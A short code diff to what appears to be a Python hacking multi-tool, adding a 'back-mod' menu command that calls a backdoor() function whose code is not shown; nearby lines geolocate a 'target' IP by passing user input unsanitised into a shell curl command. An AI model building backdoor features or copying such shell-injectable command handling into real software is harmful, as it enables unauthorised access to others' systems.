@@ -471,6 +471,9 @@ def main():
         ip=input("Enter Your Target Ip Adress:- ")
         execute('curl http://ip-api.com/json/'+ip+' -s |python -m json.tool')
         main()
+    elif inp=="back-mod":
+        backdoor()
+        main()
     else:
         print('logframe: '+inp+': command not found')
         main()
